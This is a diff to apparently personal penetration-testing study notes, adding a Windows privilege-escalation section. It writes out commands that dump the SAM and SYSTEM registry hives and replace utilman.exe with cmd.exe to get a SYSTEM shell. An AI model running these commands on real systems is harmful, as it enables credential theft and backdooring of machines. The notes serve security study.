@@ -283,7 +283,7 @@
   * kiwi
 * [searchsploit](https://www.exploit-db.com/searchsploit)
 * [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-* 
+* [impacket](https://github.com/fortra/impacket)
 
 #### Priviledge Escalation
 
@@ -437,7 +437,27 @@
       * `accesschk64.exe -qlc service_name`
       * `SERVICE_ALL_ACCESS`
         Can reconfigure the service
-  * 
+  * Windows Privileges
+    * `whoami /priv`
+    * [Priv2Admin](https://github.com/gtworek/Priv2Admin)
+    * `SeBackup/SeRestore`
+      Allow users to read and write to any file in the system, ignoring any DACL in place.
+      * `reg save hklm\system C:\Users\THMBackup\system.hive`
+      * `reg save hklm\sam C:\Users\THMBackup\sam.hive`
+    * `SeTakeOwnership`
+      Allows a user to take ownership of any object on the system.
+      * `utilman.exe`
+      * `takeown /f C:\Windows\System32\Utilman.exe`
+      * `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
+      * `copy cmd.exe utilman.exe`
+      * Clicking on ease of access button (`utilman`), now we get a `cmd` with system privileges.
+    * `SeImpersonate/SeAssignPrimaryToken `
+      Allow a process to impersonate other users and act on their behalf.
+  * Vulnerable Softwares
+    * `wmic`
+      * `wmic product get name,version,vendor`
+    * Case Studies
+      * Druva inSync 6.6.3
   * 
 
 #### OSINT
